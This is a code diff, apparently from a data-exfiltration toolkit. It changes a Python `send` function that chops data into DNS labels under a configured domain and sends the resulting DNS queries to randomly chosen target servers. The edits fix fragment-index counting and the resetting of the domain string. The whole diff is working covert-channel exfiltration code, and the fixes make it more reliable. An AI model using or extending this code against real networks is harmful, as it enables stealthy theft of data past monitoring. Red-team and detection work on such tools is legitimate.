@@ -80,8 +80,10 @@ def send(data):
     #Length of the last remaining label
     last_label_len = (rem % 64) - 1
 
-    fragment_index = 0
+    fragment_index = -1
     while data != "":
+        domain = ""
+        fragment_index += 1
         data = jobid + data
         for i in range(0, no_labels):
             if data == "": break
@@ -98,13 +100,13 @@ def send(data):
                 data = data[last_label_len:]
                 domain += label + '.' + config['key']
         q = DNSRecord.question(domain)
-        domain = ""
+        #domain = ""
         target = choice(targets)
         try:
             app_exfiltrate.log_message(
                 'info', "[DNS] Sending {0} bytes with DNS packet to {1}. PacketIndex = {2} FragementIndex = {3} ".format(len(domain), target, packet_index, fragment_index))
+            #app_exfiltrate.log_message('info', domain)
             q.send(target, port, timeout=0.01)
-            fragment_index = fragment_index + 1
 
         except Exception as e:
             print(e)
